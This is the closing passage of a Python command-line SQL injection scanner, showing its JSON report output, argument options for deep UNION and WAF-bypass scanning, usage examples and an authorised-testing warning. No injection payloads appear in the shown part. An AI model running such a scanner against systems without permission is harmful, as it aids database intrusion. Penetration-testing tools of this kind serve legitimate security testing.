                for r in self.results if r.vulnerable
            ],
            'all_tests': [
                {
                    'parameter': r.param,
                    'type': r.injection_type.value,
                    'vulnerable': r.vulnerable,
                    'severity': r.severity.value,
                }
                for r in self.results
            ]
        }

        filename = f"sqli_report_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n{Colors.GREEN}📄 Report saved: {filename}{Colors.NC}")


def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Scanner v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s "http://localhost:3001/api/products?name=test"
  %(prog)s "http://example.com/search?q=test" --deep
  %(prog)s "http://api.example.com/users" --method POST --data '{"username":"admin"}'
  %(prog)s "http://example.com/api" --cookie "session=abc123" --header "X-API-Key: test"

⚠️  CHỈ SỬ DỤNG TRÊN HỆ THỐNG CỦA CHÍNH BẠN!
        """
    )

    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--method', '-m', default='GET', choices=['GET', 'POST'],
                        help='HTTP method (default: GET)')
    parser.add_argument('--data', '-d', help='POST data as JSON string')
    parser.add_argument('--header', '-H', action='append', default=[],
                        help='Custom header (can be used multiple times)')
    parser.add_argument('--cookie', '-c', help='Cookies as "key=value; key2=value2"')
    parser.add_argument('--timeout', '-t', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    parser.add_argument('--delay', type=int, default=3,
                        help='Delay for time-based tests (default: 3)')
    parser.add_argument('--deep', action='store_true',
                        help='Enable deep scan (UNION, bypass tests)')
    parser.add_argument('--threads', type=int, default=5,
                        help='Number of threads (default: 5)')
    parser.add_argument('--no-waf-detect', action='store_true',
                        help='Disable WAF detection')

    args = parser.parse_args()

    # Parse headers
    headers = {}
    for h in args.header:
        if ':' in h:
            key, value = h.split(':', 1)
            headers[key.strip()] = value.strip()

    # Parse cookies
    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(';'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                cookies[key.strip()] = value.strip()

    # Parse POST data
    data = None
    if args.data:
        try:
            data = json.loads(args.data)
        except json.JSONDecodeError:
            print(f"{Colors.RED}[!] Invalid JSON data{Colors.NC}")
            sys.exit(1)

    # Create config
    config = ScanConfig(
        url=args.url,
        method=args.method,
        data=data,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        delay=args.delay,
        threads=args.threads,
        deep_scan=args.deep,
        detect_waf=not args.no_waf_detect,
    )

    # Warning banner
    print(f"\n{Colors.RED}{'='*60}{Colors.NC}")
    print(f"{Colors.RED}⚠️  WARNING: Educational/authorized testing only!{Colors.NC}")
    print(f"{Colors.RED}⚠️  Only use on systems you own or have permission to test.{Colors.NC}")
    print(f"{Colors.RED}{'='*60}{Colors.NC}")

    # Run scanner
    scanner = SQLInjectionScanner(config)
    scanner.scan()
    scanner.print_summary()


if __name__ == '__main__':
    main()
